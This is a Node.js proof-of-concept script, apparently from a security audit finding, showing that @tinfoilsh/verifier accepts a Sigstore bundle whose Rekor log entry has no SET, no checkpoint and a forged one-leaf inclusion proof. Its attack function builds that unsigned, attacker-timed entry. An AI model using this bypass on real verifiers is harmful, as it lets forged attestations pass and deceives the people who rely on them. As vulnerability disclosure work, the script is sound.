// Finding 10 PoC: @tinfoilsh/verifier 1.2.2 accepts a Sigstore bundle whose Rekor entry carries
// no Rekor signature at all (no SET, no checkpoint, self-made Merkle proof) when it resolves
// @freedomofpress/sigstore-browser <= 0.1.14.
//
// Usage: node poc.mjs <npm project dir with @tinfoilsh/verifier installed> <attestation-bundle.json>
// Uses only the published npm packages, their bundled Sigstore trusted root, and the genuine
// production fixture shipped in tinfoil-js (packages/verifier/test/fixtures/attestation-bundle.json).
import fs from 'node:fs';
import path from 'node:path';
import { createHash } from 'node:crypto';
import { pathToFileURL } from 'node:url';

const [projectDir, fixturePath] = process.argv.slice(2);
const nm = path.resolve(projectDir, 'node_modules');
const ver = (p) => JSON.parse(fs.readFileSync(path.join(nm, p, 'package.json'), 'utf8')).version;
const { Verifier } = await import(pathToFileURL(path.join(nm, '@tinfoilsh/verifier/dist/index.js')).href);
const fixture = JSON.parse(fs.readFileSync(fixturePath, 'utf8'));

// verifyBundle() is offline; make any network attempt fail loudly.
globalThis.fetch = async (u) => { throw new Error('unexpected network access: ' + u); };

console.log(`@tinfoilsh/verifier ${ver('@tinfoilsh/verifier')} | @freedomofpress/sigstore-browser ${ver('@freedomofpress/sigstore-browser')} | node ${process.version} | now ${new Date().toISOString()}`);

// RFC 6962 leaf hash of the entry body: a 1-leaf "tree" whose root is the leaf itself.
const leafHash = (bodyB64) =>
  createHash('sha256').update(Buffer.concat([Buffer.from([0]), Buffer.from(bodyB64, 'base64')])).digest('base64');

async function run(label, mutate) {
  const bundle = structuredClone(fixture);
  mutate(bundle.sigstoreBundle.verificationMaterial.tlogEntries[0]);
  const v = new Verifier({ configRepo: 'tinfoilsh/confidential-model-router' });
  let res;
  try { await v.verifyBundle(bundle); res = 'ACCEPTED'; }
  catch (e) { res = 'rejected (' + (e.cause?.message ?? e.message) + ')'; }
  const doc = v.getVerificationDocument();
  console.log(`${label.padEnd(58)} -> ${res} securityVerified=${doc?.securityVerified}`);
}

await run('control: unmodified production fixture', () => {});
await run('control: checkpoint signature tampered', (e) => {
  const env = e.inclusionProof.checkpoint.envelope;
  const m = env.match(/— (\S+) (\S+)\n$/);
  const sig = Buffer.from(m[2], 'base64'); sig[sig.length - 1] ^= 1;
  e.inclusionProof.checkpoint.envelope = env.slice(0, m.index) + '— ' + m[1] + ' ' + sig.toString('base64') + '\n';
});
await run('control: SET (inclusionPromise) tampered', (e) => {
  const s = Buffer.from(e.inclusionPromise.signedEntryTimestamp, 'base64'); s[s.length - 1] ^= 1;
  e.inclusionPromise.signedEntryTimestamp = s.toString('base64');
});
const unsigned = (t) => (e) => {
  delete e.inclusionPromise;                                   // no SET
  e.logId = { keyId: Buffer.alloc(32, 0x41).toString('base64') }; // not a known log
  e.logIndex = '1';
  e.integratedTime = t;                                        // attacker-chosen, unsigned
  e.inclusionProof = { logIndex: '0', treeSize: '1', hashes: [], rootHash: leafHash(e.canonicalizedBody) }; // no checkpoint
};
// Fulcio leaf validity in the fixture: notBefore 1769121722, notAfter 1769122322 (10 minutes).
await run('ATTACK: no SET, no checkpoint, self-made proof, t=1769122000', unsigned('1769122000'));
await run('bound: same, integratedTime 1s after cert notAfter', unsigned('1769122323'));
